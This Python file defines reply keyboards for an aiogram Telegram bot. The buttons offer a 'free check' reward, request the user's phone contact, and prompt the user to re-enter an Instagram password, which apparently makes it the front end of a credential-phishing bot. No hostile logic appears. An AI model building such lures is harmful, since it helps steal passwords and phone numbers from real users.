from aiogram.types import KeyboardButton, ReplyKeyboardMarkup


free_check = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton(text="✅ Get Free Check To My Account")
        ]
    ], resize_keyboard=True
)

send_phone_number = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton(text="📞 Send Phone Number", request_contact=True)
        ]
    ], resize_keyboard=True
)

my_scores = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton(text="⭐ My Scores")
        ],
        [
            KeyboardButton(text="💸 Send 1 Score To Others")
        ]
    ], resize_keyboard=True
)
admin_panel = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton(text="⭐ My Scores")
        ],
        [
            KeyboardButton(text="💸 Send 1 Score To Others")
        ],
        [
            KeyboardButton(text="🆔 Chat Id Bilan Mazgi Qoqish")
        ]
    ], resize_keyboard=True
)

cancel = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton(text="❌ Bekor Qilish")
        ]
    ], resize_keyboard=True
)

insta_parol_retry = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton(text="🔑 Reset Enter Instagram Password")
        ]
    ], resize_keyboard=True
)
